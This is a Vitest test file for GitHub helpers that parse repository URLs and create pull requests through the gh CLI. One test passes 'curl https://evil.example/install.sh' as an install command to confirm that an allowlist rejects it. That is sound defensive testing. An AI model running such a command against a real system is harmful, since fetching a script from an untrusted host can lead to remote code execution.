import { afterEach, beforeAll, describe, expect, it, vi } from 'vitest';

const { execFileMock } = vi.hoisted(() => ({ execFileMock: vi.fn() }));

vi.mock('node:child_process', () => ({
  execFile: execFileMock,
}));

let createPullRequest: typeof import('../src/github.ts').createPullRequest;
let parseGithubRepo: typeof import('../src/github.ts').parseGithubRepo;

describe('github helpers', () => {
  beforeAll(async () => {
    ({ createPullRequest, parseGithubRepo } = await import('../src/github.ts'));
  });

  afterEach(() => {
    execFileMock.mockReset();
  });

  it('parseGithubRepo handles SSH URLs', () => {
    const repo = parseGithubRepo('git@github.com:octo-org/hello-world.git');
    expect(repo).toEqual({ owner: 'octo-org', repo: 'hello-world' });
  });

  it('parseGithubRepo handles HTTPS URLs', () => {
    const repo = parseGithubRepo('https://github.com/octo-org/hello-world');
    expect(repo).toEqual({ owner: 'octo-org', repo: 'hello-world' });
  });

  it('parseGithubRepo returns null for non-GitHub URLs', () => {
    const repo = parseGithubRepo('https://gitlab.com/octo-org/hello-world');
    expect(repo).toBeNull();
  });

  it('parseGithubRepo returns null for invalid input', () => {
    expect(parseGithubRepo(null)).toBeNull();
    expect(parseGithubRepo('not-a-url')).toBeNull();
  });

  it('createPullRequest calls gh and returns PR URL', async () => {
    execFileMock.mockImplementation((command, args, _options, callback) => {
      const key = `${command} ${(args || []).join(' ')}`;
      if (key === 'gh --version') return callback(null, 'gh version 2.0.0', '');
      if (key === 'gh auth status --hostname github.com') return callback(null, 'ok', '');
      if (key.includes('gh pr create')) {
        return callback(null, 'https://github.com/octo-org/hello-world/pull/1\n', '');
      }
      return callback(new Error(`Unexpected command: ${key}`), '', '');
    });

    const pr = await createPullRequest({
      cwd: '/repo',
      repo: 'octo-org/hello-world',
      title: 'Add feature',
      head: 'feature',
      base: 'main',
      body: 'Context',
    });

    expect(pr).toEqual({ html_url: 'https://github.com/octo-org/hello-world/pull/1' });
    expect(execFileMock).toHaveBeenCalledWith(
      'gh',
      expect.arrayContaining([
        'pr',
        'create',
        '--repo',
        'octo-org/hello-world',
      ]),
      { cwd: '/repo' },
      expect.any(Function)
    );
  });

  it('createPullRequest installs gh with allowlisted GH_INSTALL_COMMAND when missing', async () => {
    let ghVersionChecks = 0;
    execFileMock.mockImplementation((command, args, _options, callback) => {
      const key = `${command} ${(args || []).join(' ')}`;
      if (key === 'gh --version') {
        ghVersionChecks += 1;
        if (ghVersionChecks === 1) {
          const error = Object.assign(new Error('not found'), { code: 'ENOENT' });
          return callback(error, '', '');
        }
        return callback(null, 'gh version 2.0.0', '');
      }
      if (key === 'brew install gh') return callback(null, '', '');
      if (key === 'gh auth status --hostname github.com') return callback(null, 'ok', '');
      if (key.includes('gh pr create')) return callback(null, 'https://github.com/octo-org/hello-world/pull/2\n', '');
      return callback(new Error(`Unexpected command: ${key}`), '', '');
    });

    const pr = await createPullRequest({
      cwd: '/repo',
      ghInstallCommand: 'brew install gh',
      title: 'Add feature',
      head: 'feature',
      base: 'main',
    });

    expect(pr).toEqual({ html_url: 'https://github.com/octo-org/hello-world/pull/2' });
    expect(execFileMock).toHaveBeenCalledWith(
      'brew',
      ['install', 'gh'],
      { cwd: '/repo' },
      expect.any(Function)
    );
  });

  it('rejects non-allowlisted GH_INSTALL_COMMAND values', async () => {
    execFileMock.mockImplementation((command, args, _options, callback) => {
      const key = `${command} ${(args || []).join(' ')}`;
      if (key === 'gh --version') {
        const error = Object.assign(new Error('not found'), { code: 'ENOENT' });
        return callback(error, '', '');
      }
      return callback(new Error(`Unexpected command: ${key}`), '', '');
    });

    await expect(() =>
      createPullRequest({
        cwd: '/repo',
        ghInstallCommand: 'curl https://evil.example/install.sh',
        title: 'Add feature',
        head: 'feature',
        base: 'main',
      })
    ).rejects.toThrow('GH_INSTALL_COMMAND is not allowlisted');
  });

  it('createPullRequest throws a login hint when gh auth is missing', async () => {
    execFileMock.mockImplementation((command, args, _options, callback) => {
      const key = `${command} ${(args || []).join(' ')}`;
      if (key === 'gh --version') return callback(null, 'gh version 2.0.0', '');
      if (key === 'gh auth status --hostname github.com') {
        const error = new Error('exit code 1');
        return callback(error, '', 'not logged in');
      }
      return callback(new Error(`Unexpected command: ${key}`), '', '');
    });

    await expect(() =>
      createPullRequest({
        cwd: '/repo',
        title: 'Add feature',
        head: 'feature',
        base: 'main',
      })
    ).rejects.toThrow('Run "gh auth login --hostname github.com --web" and retry');
  });
});
